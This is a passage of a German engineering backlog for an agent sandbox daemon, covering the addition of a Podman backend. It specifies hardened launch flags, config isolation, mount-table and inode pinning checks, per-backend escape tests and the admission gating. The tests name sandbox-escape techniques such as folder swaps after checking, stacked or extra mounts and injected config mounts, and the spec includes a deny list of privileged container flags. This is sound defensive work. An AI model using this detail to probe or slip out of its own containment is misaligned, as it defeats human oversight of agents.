6. Zulassung: Eine feste Liste im Code (`ADMITTED_BACKENDS`) nennt, welche Stufen wählbar sind; in diesem Commit nur `bwrap` und `seatbelt`. `sandbox.backend = "podman"` ist im Schema gültig, aber jeder Start damit (Konfiguration, `cli_overrides`, CLI, `doctor --probe`) scheitert mit `SANDBOX_048`; `auto` löst nie auf eine nicht zugelassene Stufe auf. Die Umgehung `Backend::detect_unadmitted` steht hinter dem Cargo-Feature `unadmitted-backends` der Crate `humanitl-sandbox`; nur `escape-launch` (eigenes `required-features`) und die Tests schalten es ein, `humanitld` und `humanitl` nie. Es ist also im ausgelieferten Code nicht vorhanden, nicht nur nicht aufgerufen.
7. Codes `SANDBOX_034` bis `SANDBOX_036` und `SANDBOX_048` registrieren, Bereich `SANDBOX` auf 001-059 erweitern, `docs/DIAGNOSTICS.md` neu erzeugen; `docs/CONFIG.md` aus dem Schema neu erzeugen.

### Tests
- Config-Unit: `sandbox.backend` in `<projekt>/.humanitl/profile.toml` ist `CONFIG_003` (Projekt gesperrt); jeder Schlüssel unter `sandbox.podman` ebenso.
- Config-Unit, Tabelle: `min_isolation` Nutzer `namespaces`, Projekt `kernel` ergibt `kernel`; Nutzer `kernel`, Projekt `policy` ergibt `kernel` (das Projekt senkt nie); CLI `policy` über Nutzer `kernel` ergibt `kernel`.
- Unit: `bwrap` gewählt bei Untergrenze `kernel` ergibt `SANDBOX_035`; Sandbox-Profil `backend = "bwrap"` bei Wahl `podman` ergibt `SANDBOX_036`.
- Unit: `sandbox.backend = "podman"` aus `config.toml`, aus `--backend` und aus `cli_overrides` scheitert vor HUM-448 jeweils mit `SANDBOX_048`.
- Prüfung im Test (`tools/check-deps.sh` oder ein Grep-Test): `detect_unadmitted` und das Feature `unadmitted-backends` erscheinen nur in `escape-launch`, in `#[cfg(test)]`-Code und in `tests/`; `cargo tree -e features -p humanitld` und `-p humanitl` zeigen das Feature nicht.
- Mutationsbeweis: die Zusammenführung von `min_isolation` auf „oberste Ebene gewinnt" umgestellt färbt den Projekt-Test rot; `podman` in `ADMITTED_BACKENDS` eingetragen färbt den Zulassungstest rot.

### Akzeptanzkriterien
1. Jeder neue Schlüssel hat Vorgabe, Stufe und Projekt-Sperre im Schema und erscheint in `docs/CONFIG.md`.
2. Kein Weg aus einem Projekt senkt die Stufe oder wählt das Backend; ein Test je Weg (Projektprofil, Projektumgebung ist keiner, CLI-Override aus dem Start-RPC nur mit Erlaubnisliste).
3. `config_readers.rs` führt die neuen Schlüssel; solange HUM-433 fehlt, sind die `sandbox.podman`-Schlüssel dort als offen mit HUM-433 markiert.

### Fallstricke
- `HUMANITL_SANDBOX__BACKEND` aus der Umgebung ist Ebene 6 und damit Nutzerwille, kein Projektwille; aber `min_isolation` gilt auch gegen sie.
- Das Sandbox-Profil bleibt eine Anforderung, keine zweite Wahl; sonst gibt es zwei Quellen der Wahrheit (ADR-0011).

## HUM-432 · RPC und CLI: Backends auflisten, `--backend`, Isolationsstufe im Status

### Kontext
ADR-0018: Jede Fähigkeit ist zuerst ein RPC. Oberfläche und CLI müssen wissen, welche Backends es gibt, welche Stufe sie bieten und was fehlt, ohne selbst zu prüfen.

### Spezifikation
1. Neues RPC `SandboxBackends(google.protobuf.Empty) returns (SandboxBackendList)`; je Eintrag `name`, `isolation_level`, `available`, `selected`, `diagnostics` (fehlende Voraussetzungen als `Diagnostic`), `runtimes` (bei Podman `crun`, `krun` mit eigener Verfügbarkeit). Die Antwort kommt aus `Backend::detect` je Name, ohne Start.
2. `Sandbox.Status` bekommt `isolation_level`; `backend` nennt weiter das echte Backend, bei Podman mit Laufzeit (`podman/crun`).
3. CLI: `humanitl sandbox backends` (Tabelle, `--json`), `--backend <name>` und `--podman-runtime <crun|krun>` an `humanitl run` und `humanitl sandbox run`, als `cli_overrides`. Die Erlaubnisliste des Start-RPC bekommt genau `sandbox.backend` und `sandbox.podman.runtime`.
4. `fake_daemon_client.dart` und `ipc/src/fake` bekommen den neuen Aufruf (nur eigener Abschnitt, am Ende angehängt); Paritätstabelle nachgezogen. `PROTO_MINOR` steigt.

### Tests
- IPC: Vor HUM-448 ist `podman` `available = false` mit `SANDBOX_048`, auch wenn Podman installiert ist; ohne `podman` im `PATH` steht zusätzlich `SANDBOX_034` mit `fix`; `bwrap` unverändert.
- IPC: `cli_overrides` mit `sandbox.backend = "podman"` bei Untergrenze `kernel` wird mit `SANDBOX_035` abgelehnt; ein anderer Pfad als die zwei erlaubten bleibt `CONFIG_003`.
- CLI: `humanitl sandbox backends --json` gibt die Liste aus dem Fake aus.
- Mutationsbeweis: `cli_overrides` ohne Prüfung der Untergrenze färbt den zweiten IPC-Test rot.

### Akzeptanzkriterien
1. `parity-check` grün, CLI-Zeile für das neue RPC vorhanden.
2. `Status.isolation_level` stimmt mit `SandboxBackend::isolation` des laufenden Backends überein.
3. Kein still gewähltes Ersatz-Backend: Ein nicht verfügbares gewähltes Backend lässt den Start mit `SANDBOX_034` scheitern.

### Fallstricke
- `fake_daemon_client.dart` ist eine gemeinsam genutzte Datei: vor dem Schreiben neu einlesen, nur anhängen.
- Die Liste darf nicht bei jedem Aufruf einen Probestart machen; `doctor` macht ihn (HUM-436).

## HUM-433 · Podman-Adapter, gemeinsame Stufe: erkennen, planen, starten, beenden, prüfen

### Kontext
Kern des Sprints. Entwurf im HUM-292-Ergebnis, Abschnitte 3, 4 und 8. Voraussetzung: P0 bis P9 und P11, P12 gemessen und im Abschnitt von HUM-292 eingetragen.

### Spezifikation
1. Modul `daemon/crates/sandbox/src/podman/` (`mod.rs`, `detect.rs`, `plan.rs`, `teardown.rs`); `PodmanBackend` und die Variante `Backend::Podman`.
2. `detect`: Programm aus `sandbox.podman.program` oder `PATH`, Version mindestens 4.9, rootless, lokal, Laufzeit `crun`, untergeordnete IDs, delegierte Controller, kein erzwingendes SELinux; jede Lücke ein Code aus `SANDBOX_034`, `SANDBOX_037` bis `SANDBOX_040`, `SANDBOX_044` mit `why` und kopierbarem `fix`.
3. `plan`: ein `podman run` mit `--rm`, `--name humanitl-<session>`, Label `humanitl.daemon=<instanz>`, `--network none`, `--ipc private`, `--uts private`, `--pid private`, `--cgroupns private`, `--userns keep-id`, `--cap-drop all`, `--security-opt no-new-privileges`, `--read-only`, `--log-driver none`, `--pull never`, `--hostname sandbox`, `--no-hosts`, `--read-only-tmpfs=false` (sonst legt Podman zu `--read-only` beschreibbare tmpfs auf `/run`, `/tmp` und `/var/tmp`, die nicht im Profil stehen), `--env-host=false`, `--http-proxy=false`, `--hooks-dir <leeres Verzeichnis>`, `--security-opt seccomp=<eigene Datei>`, `--memory`, `--cpus`, `--pids-limit`, `--conmon-pidfile`, `--preserve-fds <n>`; Wurzel `rootfs = "host"` als leeres, nur lesbares Verzeichnis mit den Binds aus dem Profil; Proxy-Socket als einzelne Datei nach `PROXY_SOCKET_DST`; Masken, CA, Bundle, Identitätsdateien und Adapterdateien wie unter bwrap; der Shim als Einstiegspunkt mit `--lifeline-fd`, `--env-fd`, Bericht und, am eigenen PTY, `--control-fd` (HUM-299).
4. Keine Konfigurationsquelle, die der Daemon nicht schreibt, erreicht Podman (Tabelle im HUM-292-Ergebnis, Abschnitt 3): `CONTAINERS_CONF` auf eine vom Daemon geschriebene `containers.conf` mit `default_mounts_file` auf eine leere Datei (kein `mounts.conf`, kein `/run/secrets`), leerem `hooks_dir` und eigenem `seccomp_profile`; `CONTAINERS_STORAGE_CONF` und `CONTAINERS_REGISTRIES_CONF` auf eigene Dateien; `CONTAINERS_CONF_OVERRIDE`, `CONTAINER_HOST`, `CONTAINER_CONNECTION` aus der Umgebung entfernt. Podman startet mit leerer Umgebung außer diesen Variablen, `HOME`, `XDG_RUNTIME_DIR` und `PATH`.
5. `launch` nutzt `launch_plan` (`bwrap.rs:1156`) mit `Teardown::Container`: `podman kill --signal TERM`, `KILL_GRACE`, `podman rm -f`. `sandbox_pid` aus `--conmon-pidfile` und `podman inspect`.
6. `isolation_check` über `isolation_from_report` (die fünf `CHECK`-Zeilen); `isolation()` ist `Namespaces`.
7. Beim Start des Daemons: alle Container mit dem Label der Instanz entfernen, `SANDBOX_041` als Warnung je Rest.
8. `tools/coupling-baseline.toml` bekommt `[podman]`, `tools/check_coupling.py` zählt `podman`, `crun`, `krun`, `libkrun`, `conmon` außerhalb von `src/podman/`.
9. `docs/SECURITY.md` bekommt den Abschnitt „Linux: Podman" mit den drei Garantien in der gemeinsamen Stufe; `docs/THREAT-MODEL.md` einen K-Eintrag für die Container-Engine (Podman, `conmon`, Speicher des Nutzers, `containers.conf`).
10. Der Adapter liest die Gruppe, die HUM-431 angelegt hat, und `config_readers.rs` stuft jeden ihrer Schlüssel als `effective` ein: `sandbox.podman.program`, `sandbox.podman.runtime` (nur `crun`; `krun` lehnt bis HUM-444 mit `SANDBOX_048` ab), `sandbox.podman.memory_mib` (`--memory`; leer: die Hälfte des Arbeitsspeichers des Hosts, höchstens 4096 MiB), `sandbox.podman.cpus` (`--cpus`; leer: die Hälfte der CPUs, die der Daemon nutzen darf, mindestens 1, höchstens 4), `sandbox.podman.pids_limit` (`--pids-limit`), `sandbox.podman.start_timeout_secs` (Frist bis zum Bericht), `sandbox.podman.rootfs` und `sandbox.podman.image` (bis HUM-439 lehnt `rootfs = "image"` den Start mit `Diagnostic` ab, statt still `host` zu nehmen).

### Tests
- Unit `plan.rs`: die Zeile enthält jedes feste Flag genau einmal und kein `-e`, kein `-t`, kein `--privileged`, kein `--network` außer `none`, kein `--cap-add`, kein `--device`, kein `:z`/`:Z`; eine Tabelle prüft das gegen eine Verbotsliste.
- Unit: jedes Profil mit `extra_rw` erzeugt genau einen beschreibbaren Bind außer `/work`; Masken nur für vorhandene Pfade, fehlende stehen in `unprotected`.
- Integration (übersprungen ohne `podman`, mit Grund): Sitzung startet, `CHECK`-Zeilen alle `ok`, Exit-Status 7 kommt als 7 an, `kill` hinterlässt keinen Container (`podman ps -a --filter label=...` leer).
- Integration: Daemon-Prozess mit `SIGKILL` beendet, Container weg nach `KILL_GRACE` plus Startfrist (Lebensleine).
- Integration: Daemon mit `HTTPS_PROXY=http://user:pw@proxy.invalid:3128` in der eigenen Umgebung; weder die Umgebung des Agenten (`/proc/<agent>/environ` über den Bericht) noch `podman inspect` des laufenden Containers enthält `user:pw` oder `proxy.invalid`.
- Integration: ein Eintrag in `~/.config/containers/mounts.conf` (im Test über ein eigenes `HOME`) und eine `volumes`-Zeile in `CONTAINERS_CONF_OVERRIDE` erscheinen nicht im Container, kein `/run/secrets`; ein Hook im Hook-Verzeichnis des Nutzers läuft nicht.
- Integration am PTY: Agent mit Terminal, Größenänderung kommt an (`stty size`), `humanitl sandbox attach` mit Detach und erneutem Attach, zweite Shell über `humanitl sandbox exec` mit eigenem Terminal und dem Filter des Agenten (`socket(AF_UNIX)` verweigert).
- Mutationsbeweis: `--network none` entfernt färbt `no_interfaces` rot; ein zusätzlicher Socket-Bind färbt `single_socket` rot; `Teardown::Container` durch `Process` ersetzt färbt den Kill-Test rot; `--http-proxy=false` entfernt färbt den Proxy-Variablen-Test rot; `default_mounts_file` entfernt färbt den `mounts.conf`-Test rot (solange die Mounttabellen-Prüfung aus HUM-437 fehlt; danach färbt sie ihn mit `SANDBOX_049` rot).

### Akzeptanzkriterien
1. Über `detect_unadmitted` (Integrationstests, `escape-launch`) läuft eine Sitzung mit Terminal, Attach, Detach, Größenänderung und weiteren Shells wie unter bwrap. Für Nutzer bleibt Podman mit `SANDBOX_048` gesperrt (HUM-448).
2. Fehlt eine Voraussetzung, startet nichts, und der Code nennt sie; kein Rückfall auf bwrap.
3. Kein Umgebungswert in `argv`, `podman inspect` oder unter `~/.local/share/containers`.
4. Kopplungszahlen außerhalb von `src/podman/` steigen nicht.

### Fallstricke
- Ein Mountpunkt, den es in `/work` nicht gibt, legt crun im Projekt an; deshalb Masken nur auf vorhandenen Pfaden, genau wie `present_under_work` unter bwrap.
- `--rm` und ein Kill-Pfad, der selbst `rm -f` ruft, laufen gegeneinander; ein „no such container" beim Aufräumen ist Erfolg.
- `--userns keep-id` und `--read-only` verlangen, dass `/home/agent` und `/tmp` aus dem Profil als tmpfs kommen; die Wurzel bleibt unbeschreibbar.
- Der Daemon läuft unter der Nutzer-Unit; bis HUM-434 ist der Pfad nur in Tests außerhalb der Unit geprüft. Das steht im Commit-Body.

## HUM-434 · Podman unter der gehärteten Nutzer-Unit

### Kontext
`packaging/systemd/humanitld.service` setzt unter anderem `PrivateUsers=yes`, `ProtectSystem=strict`, `ProtectControlGroups=yes`, `NoNewPrivileges=yes`, `CapabilityBoundingSet=CAP_SYS_ADMIN`, `ProtectProc=invisible`, `RestrictFileSystems`, `PrivateIPC`, `PrivateMounts` und einen Syscall-Filter. Rootless Podman braucht Schreibzugriff auf seinen Speicher, `newuidmap` und `newgidmap` (die `CAP_SETUID` und `CAP_SETGID` brauchen, die `NoNewPrivileges` und die Begrenzungsmenge nehmen) und eine cgroup. Messung P8 läuft mit jeder Eigenschaft der echten Unit, aus der Datei erzeugt, und lässt dann je eine weg.

### Spezifikation
1. Nach dem Ergebnis von P8 genau eine der zwei Lösungen, mit der Begründung im Commit: (a) Unit-Eigenschaften gezielt gelockert, nur was P8 als nötig belegt, oder (b) Start von Podman über den systemd-Manager des Nutzers, wenn (a) die Härtung des Daemons zu weit öffnet; bei (b) bekommt der Shim seine Deskriptoren über die Tür statt über `--preserve-fds`, und die Frage geht vorher an den Inhaber (HUM-292, Frage 2).
2. `docs/SECURITY.md` Abschnitt „Service hardening" nennt jede gelockerte Eigenschaft und warum; `docs/THREAT-MODEL.md` passt den Eintrag des Daemons an.
3. ADR-0010 bekommt den Nachtrag zur Unit (der Rest des Nachtrags kommt in HUM-441).

### Tests
- `packaging/systemd`-Test (vorhanden für die Unit): die erwarteten Eigenschaften stehen in der Datei; ein Test sieht jede gelockerte Eigenschaft im Abschnitt „Service hardening" von `docs/SECURITY.md` genannt.
- Manuell, im Commit-Body: Daemon als Unit, Sitzung mit `--backend podman` startet und endet sauber.

### Akzeptanzkriterien
1. Eine Sitzung mit Podman startet aus der App unter der installierten Unit.
2. bwrap-Sitzungen laufen unverändert; keine Eigenschaft wird für bwrap gelockert, die nur Podman braucht, wenn (a) das getrennt ausdrücken kann.

### Fallstricke
- `ReadWritePaths` auf `~/.local/share/containers` gibt dem Daemon Schreibzugriff auf alle Abbilder des Nutzers; das ist eine Aussage in `docs/SECURITY.md`, nicht nur eine Zeile in der Unit.
- `NoNewPrivileges` entwaffnet `newuidmap` mit Datei-Capabilities; ohne untergeordnete IDs fällt `--userns keep-id` weg, und das ist dann `SANDBOX_039`, kein stiller Wechsel der Abbildung.

## HUM-435 · Escape-Suite je Backend und CI-Job `escape-tests-podman`

### Kontext
Ein Backend ist erst zulässig, wenn `tests/escape/` gegen es grün ist (BACKLOG.md 9.1). Die Suite startet heute über `BwrapBackend` (`daemon/crates/sandbox/src/bin/escape-launch.rs:308, 410`).

### Spezifikation
1. `escape-launch` nimmt `--backend <name>` und nutzt `Backend::detect_unadmitted`, damit die Suite eine Stufe vor ihrer Zulassung prüfen kann; `tests/escape/run.sh` liest `HUMANITL_ESCAPE_BACKEND` (Vorgabe `bwrap`) und reicht ihn durch.
2. Jede Probe läuft gegen jedes Backend. Proben, die bwrap-Eigenheiten voraussetzen (etwa die Flags in `/proc/1/cmdline`), bekommen eine Fassung je Backend; keine Probe entfällt.
3. Neue Proben für Podman in ESC-2: kein `/run/.containerenv`-Inhalt außer dem erwarteten, kein Socket von `conmon` in der Sandbox, `/proc/1/status` zeigt `Seccomp: 2` für den Shim.
4. CI-Job `escape-tests-podman` auf `ubuntu-24.04`, gleiche Schritte und Urteilslogik wie `escape-tests`, plus `podman --version` und `podman info` als Beleg (P16); Pfadregeln in `tools/ci-changes.sh` (HUM-424); `ci-ok` verlangt ihn.

### Tests
- Die Suite selbst; `selftest.sh` um einen Lauf mit `HUMANITL_ESCAPE_BACKEND=podman` gegen eine Attrappe ergänzt.
- Mutationsbeweis in der CI dokumentiert (einmalig, im Commit-Body mit Lauf-ID): `--network none` im Adapter entfernt färbt ESC-1 rot; ein zweiter Socket-Bind färbt ESC-2 rot.

### Akzeptanzkriterien
1. `escape-tests-podman` ist grün mit null übersprungenen Proben, die bwrap grün hat.
2. Ein Lauf, der Podman nicht starten kann, ist `error`, nie `pass` oder `skip`.
3. `docs/SECURITY.md` Abschnitt 9 nennt den neuen Job; `docs/THREAT-MODEL.md` trägt ESC-1 und ESC-2 als Prüfung beim K-Eintrag der Container-Engine ein.

### Fallstricke
- Auf dem Runner ist Podman 4.9; ein Feature aus Podman 5 im Adapter macht den Job rot, nicht gelb.
- Der Job braucht dieselbe AppArmor-Freigabe für Nutzer-Namensräume wie `escape-tests`.

## HUM-436 · `doctor` je Backend mit Probestart

### Kontext
`doctor` prüft heute bwrap (`daemon/crates/sandbox/src/doctor/probe.rs:52, 233`, `doctor/checks.rs`). Mit zwei Backends fragt er jedes, und für das gewählte macht er auf Wunsch einen Probestart.

### Spezifikation
1. Prüfzeilen je Backend aus `Backend::detect` und den Voraussetzungen aus HUM-433, jede mit `ok`, `warn` oder `fail`, `why` und `fix`.
2. `humanitl doctor --probe` startet je verfügbarem Backend einen leeren Container mit dem Shim (`true` als Befehl) und prüft die fünf `CHECK`-Zeilen; das Ergebnis wird mit den Werkzeugversionen zwischengespeichert, bis sich eine Version ändert. Scheitern: `DOCTOR_014`.
3. Die Oberfläche (`app/lib/core/domain/doctor.dart`) zeigt die Zeilen gruppiert nach Backend; Texte über ARB.
4. Eine nicht zugelassene Stufe zeigt `doctor` als `warn` mit `SANDBOX_048` („noch nicht zugelassen") und den statischen Prüfzeilen aus `detect`; `--probe` startet für sie nichts und meldet für diese Stufe `SANDBOX_048`. Der Probestart läuft nur für zugelassene Stufen; `doctor` ruft `detect_unadmitted` nie auf (es ist dort nicht einmal gebaut, HUM-431).

### Tests
- Unit: Zwischenspeicher ungültig bei anderer Podman-Version.
- Unit: vor HUM-448 liefert `doctor --probe` für `podman` `SANDBOX_048` und startet keinen Prozess (Attrappe für `podman` zählt Aufrufe: null).
- Integration (übersprungen ohne Podman): Probestart grün; mit falschem `sandbox.podman.program` `fail` mit `SANDBOX_034`.
- Mutationsbeweis: der Cache-Schlüssel ohne Version färbt den Unit-Test rot.

### Akzeptanzkriterien
1. `humanitl doctor` nennt für jedes Backend, ob es nutzbar ist und was fehlt.
2. Der Probestart ist nicht Teil von `SandboxBackends` (HUM-432) und läuft nur auf Wunsch.

### Fallstricke
- `os_release.rs` liefert den Installationsbefehl; für Podman gehören `podman` und `uidmap` dazu.

## HUM-437 · Mounttabelle gleich Plan, geprüfte Ordner nach dem Einhängen belegt, Masken nur auf vorhandenen Pfaden

### Kontext
bwrap hängt Deskriptoren ein (HUM-263, `--bind-fd`), ein Tausch nach der Prüfung erreicht die Sandbox nicht. Podman nimmt Pfade und löst sie später in einem anderen Prozess auf. Außerdem kann eine Konfigurationsquelle von Podman Einhängungen hinzufügen (`mounts.conf`, `/run/secrets`), die keine Sockets tragen und deshalb an der Socket-Suche von Garantie 2 vorbeigehen. HUM-292-Ergebnis Abschnitte 3 und 5; Messungen P9, P13, P14.

### Spezifikation
1. Der Plan trägt für `/work`, jeden Eintrag aus `mounts.ro`, `extra_ro`, `extra_rw` und das Agentenprogramm (HUM-278) das Paar Gerät und Inode des geöffneten Deskriptors.
2. Der Plan trägt außerdem die erwartete Mounttabelle als Multimenge von Einträgen (Einhängepunkt, Dateisystemtyp, Quelle, `ro`/`rw`, `nosuid`, `nodev`, `noexec`; Quelle bei einem Bind Gerät und Inode, sonst der Typ), mit der Anzahl je Eintrag: jeder Bind, jedes tmpfs und jede Maske des Profils, dazu die eigenen Einträge des Backends. Für Podman mit `--read-only-tmpfs=false` stehen sie in der Tabelle im HUM-292-Ergebnis Abschnitt 3 (`/proc` mit maskierten Pfaden und schreibgeschützten Selbst-Binds, `/dev` mit `/dev/pts`, `/dev/mqueue`, `/dev/shm` und den Gerätedateien, `/sys`, `/sys/fs/cgroup`, `/run/.containerenv`, `/etc/hostname`, `/etc/resolv.conf`), jeder Eintrag „zu prüfen in P17"; die Liste im Code ist die gemessene. Bei bwrap dessen eigene.
3. Beides bekommt der Shim über eine eigene Option `--pins-fd <n>`, einen versiegelten memfd mit JSON, für jedes Backend gleich; damit braucht bwrap, das die Umgebung weiter über `--setenv` trägt (`EnvDelivery::Argv`), keinen Umgebungs-memfd. Vor dem `exec` des Agenten vergleicht der Shim (a) `/proc/self/mountinfo` als Multimenge mit der erwarteten Tabelle, Eintrag für Eintrag samt Typ, Quelle und Optionen; ein zusätzlicher, fehlender oder abweichender Eintrag, auch ein zweiter auf einem erwarteten Einhängepunkt gestapelter, ist `CHECK mounts_match FAIL` und beim Daemon `SANDBOX_049`; (b) `stat` jedes Ziels mit Gerät und Inode, eine Abweichung ist `CHECK mounts_pinned FAIL` und `SANDBOX_042` mit Pfad, erwartetem und gefundenem Paar. Beide enden mit `EXIT_SETUP`, der Agent startet nicht.
4. Belegt P13, dass `/proc/self/fd/N` als Quelle den geöffneten Ordner einhängt, nutzt der Plan zusätzlich diesen Weg; sonst nur den Vergleich, und `docs/SECURITY.md` sagt „erkannt und abgelehnt" statt „verhindert".
5. Unter bwrap vergleicht der Shim genauso; dort sind beide Zeilen im Normalfall `ok`, und die Prüfung ist je Backend dieselbe.
6. `isolation_check` ordnet `mounts_match` und `mounts_pinned` der Garantie 2 zu (genau eine Tür heißt auch: keine Einhängung außerhalb des Plans).

### Tests
- Integration (übersprungen ohne Podman): Ordner nach `plan` und vor `launch` umbenannt und durch einen anderen ersetzt; Start scheitert mit `SANDBOX_042`, der Agent startet nicht.
- Unit: Abweichung nur im Inode, nur im Gerät, beides: jeweils `FAIL`.
- Unit Shim: eine `mountinfo` mit einem zusätzlichen Einhängepunkt (`/run/secrets`), eine mit einem fehlenden (`/work/.git/hooks`), eine mit einem `rw` statt `ro` und eine mit falschem Typ ergeben `mounts_match FAIL`.
- Integration gegen beide Backends (Podman übersprungen ohne Podman): ein zweiter Mount auf einem erwarteten Ziel, ein `tmpfs` über `/work` und ein Bind über `PROXY_SOCKET_DST` (Testargument, das den Plan um den Mount erweitert, nicht um die Erwartung), wird mit `SANDBOX_049` abgelehnt.
- Integration (übersprungen ohne Podman): ohne `--read-only-tmpfs=false` (Testargument) erscheinen `/run`, `/tmp`, `/var/tmp` als zusätzliche tmpfs und der Start scheitert mit `SANDBOX_049`.
- Integration (übersprungen ohne Podman): ein `mounts.conf`-Eintrag des Nutzers, an `default_mounts_file` vorbei erzwungen (Testargument, das die Datei des Daemons weglässt), wird mit `SANDBOX_049` abgelehnt.
- Mutationsbeweis: der Inode-Vergleich im Shim auf „immer gleich" gesetzt färbt den Tauschtest rot; der Mounttabellen-Vergleich auf „immer gleich" gesetzt färbt den `mounts.conf`-Test rot; der Vergleich als Menge der Ziele statt als Multimenge färbt den Stapel-Test rot.

### Akzeptanzkriterien
1. Kein Agent startet in einem Ordner, der nicht der geprüfte ist; Beleg durch den Tauschtest.
2. ESC-2 bekommt eine Probe für den Tausch und eine für eine zusätzliche Einhängung, gegen beide Backends.
3. `docs/SECURITY.md` Abschnitt 3 nennt die Mounttabellen-Prüfung; `docs/THREAT-MODEL.md` passt K-01 und K-05 für Podman an und nennt die Konfigurationsquellen von Podman beim K-Eintrag der Container-Engine.

### Fallstricke
- Ein Bind behält die Gerätenummer der Quelle (P14); unter einem Overlay (HUM-438) gilt das für `/work` nicht, dort greift die Regel aus HUM-438.
- Das Agentenprogramm ist eine Datei; `stat` folgt keinem Symlink (`AT_SYMLINK_NOFOLLOW`).

## HUM-438 · Podman: Wegwerf-Sandbox mit eigener oberer Schicht

### Kontext
HUM-350 und HUM-357: Unter bwrap liegt das Projekt nur lesbar unter einem Overlay, die obere Schicht auf tmpfs im Laufzeitverzeichnis; `disposable/scan.rs` und `apply.rs` lesen sie nach dem Ende. Podman kennt Overlay-Volumes mit eigener oberer Schicht (`:O,upperdir=,workdir=`). Messung P10.

### Spezifikation
1. `disposable_support` des Podman-Adapters: Kernel-Overlay (kein `fuse-overlayfs`), Laufzeitverzeichnis auf tmpfs, Projekt schreibbar eingehängt; sonst `SANDBOX_030` bei `disposable`, `SANDBOX_033` mit Grund bei `auto`.
2. `/work` als `-v <projekt>:/work:O,upperdir=<upper>,workdir=<work>`, Verzeichnisse aus `Layer::create`, Größe über `SizeGuard` (`SANDBOX_032`).
3. Scan, Diff, `apply`, `discard` unverändert; die obere Schicht wird erst nach dem Ende des Containers gelesen.
4. Pinning der unteren Schicht nach dem Ergebnis von P10 und P13 (HUM-292-Ergebnis Abschnitt 6); ist keins von beiden belegt, lehnt `disposable` unter Podman mit `SANDBOX_030` ab und nennt den Grund.

### Tests
- Integration (übersprungen ohne Podman): Änderung, Neuanlage, Löschung von Datei, Verzeichnis und Symlink erscheinen in `sandbox changes` mit der richtigen Art; das Projekt bleibt unverändert, bis `apply`.
- ESC-5 „ein Wegwerf-Lauf schreibt nie ins Projekt" läuft gegen Podman.
- Mutationsbeweis: `:O` durch einen schreibbaren Bind ersetzt färbt ESC-5 rot.

### Akzeptanzkriterien
1. `auto` ist unter Podman `disposable`, wo das System es kann, sonst `direct` mit `SANDBOX_033`; `disposable` fällt nie zurück.
2. Masken gelten in der Schicht wie unter bwrap.
3. `docs/SECURITY.md` 5.2 nennt Podman; `docs/THREAT-MODEL.md` K-24 nennt das Overlay-Volume von Podman als zweite Form der oberen Schicht.

### Fallstricke
- Podman legt eigene Dateien in `workdir` an; der Scan liest nur `upperdir`.
- Mit `fuse-overlayfs` sehen Whiteouts anders aus; nicht unterstützen, ablehnen.

### Umsetzung (2026-11-12)
Punkt 4 entschieden: keins von beiden belegt. P10 nachgemessen (Podman 5.8.6, Kernel 7.3.3,
Kernel-Overlay trotz installiertem `fuse-overlayfs`): Mit dem Projektpfad als untere Schicht
funktioniert das Volume (`mountinfo`: `overlay ... lowerdir=<pfad>,upperdir=..,workdir=..,
redirect_dir=nofollow,uuid=on,userxattr`, Schreiben landet in `upperdir`, Projekt unverändert),
aber Whiteouts und `workdir/work` (Modus `000`) gehören der untergeordneten Kennung 100000, und
das Verwerfen scheitert mit `SANDBOX_031`. Mit `/proc/self/fd/N` als untere Schicht scheitert
`crun` mit `Invalid argument`, wie P13. Ein `lowerdir` als Text in `mountinfo` lässt sich im
Container nicht an den geprüften Ordner binden. Darum lehnt `disposable` unter Podman mit
`SANDBOX_030` samt Grund ab, `auto` läuft direkt mit `SANDBOX_033`; ESC-5 prüft die Ablehnung.
Die Akzeptanzkriterien 1 und 3 gelten in dieser Form, 2 entfällt mangels Schicht.

## HUM-439 · Podman: Abbild als Wurzeldateisystem, mit Digest, ohne Pull beim Start

### Kontext
Der Inhaber will Sitzungen mit vorinstallierten Agenten und Werkzeugen. Unter Podman trägt ein OCI-Abbild sie. HUM-292-Ergebnis Abschnitt 7.

### Spezifikation
1. `rootfs = "image"` mit `image = "name@sha256:..."`. Vor jedem Start `podman image inspect` gegen den Digest; fehlt das Abbild oder weicht der Digest ab: `SANDBOX_043` mit `fix` „`humanitl sandbox image pull <ref>`".
2. Neues CLI-Kommando und RPC-Fall (`Sandbox`-Anfrage `ImagePull`), das ausdrücklich zieht; CLI und Oberfläche sagen vorher, dass das Ziehen das Netz direkt nutzt und nicht durch den Proxy läuft.
3. Die Binds aus dem Profil (`mounts.ro`) gelten im Abbild nicht; Projekt, Tür, CA, Shim, Adapterdateien und Sitzungsverzeichnis kommen wie in HUM-433 vom Host, nie aus dem Abbild.
4. Die Vorschau zeigt den Digest; die Tabelle nennt die Wurzel „Abbild".

### Tests
- Unit: `image` ohne `@sha256:` ist `CONFIG_003`.
- Integration (übersprungen ohne Podman): Abbild mit anderem Digest unter demselben Namen: Start mit `SANDBOX_043` abgelehnt, nichts gezogen.
- Mutationsbeweis: die Digest-Prüfung entfernt färbt den Integrationstest rot.

### Akzeptanzkriterien
1. Kein Start zieht ein Abbild; nur `image pull` tut es, auf Anforderung des Nutzers.
2. Ein CA-Zertifikat, ein Schlüssel oder ein Sitzungsverzeichnis steht nie in einem Abbild; ESC-2 prüft, dass die CA im Container vom Host kommt (Gerät und Inode).
3. `docs/SECURITY.md` nennt das Abbild als Teil der Vertrauensbasis; `docs/THREAT-MODEL.md` bekommt einen K-Eintrag für Abbild und Ziehen (Herkunft, Digest, direkter Netzzugriff beim Ziehen).

### Fallstricke
- Ein Agent vom Host, als Datei in ein Abbild gebunden, findet seine Bibliotheken vielleicht nicht; die Meldung nennt das (`AGENT_005` wie bisher).

## HUM-448 · Podman zulassen: die gemeinsame Stufe wird wählbar

### Kontext
Bis hier lehnt jeder Start mit `podman` als `SANDBOX_048` ab (HUM-431); Escape-Suite und Tests starten es über `detect_unadmitted`. Die Zulassung ist ein eigener, kleiner Commit, damit sie erst landet, wenn alles, was die Garantien unter Podman belegt, auf `main` ist.

### Spezifikation
1. Voraussetzung, im Commit-Body mit Lauf-ID belegt: `escape-tests-podman` grün auf `main` mit HUM-437 (Mounttabelle und Pinning) und HUM-438; HUM-434 und HUM-436 gelandet.
2. `ADMITTED_BACKENDS` bekommt `podman` mit der Laufzeit `crun`; `krun` bleibt gesperrt.
3. `SandboxBackends` meldet `podman` als verfügbar, wenn `detect` es ist; `auto` bleibt bwrap.
4. `docs/SECURITY.md` Abschnitt „Linux: Podman" verliert den Hinweis „noch nicht zugelassen"; `docs/THREAT-MODEL.md` setzt den K-Eintrag der Container-Engine auf `mitigated` mit ESC-1, ESC-2, ESC-5.
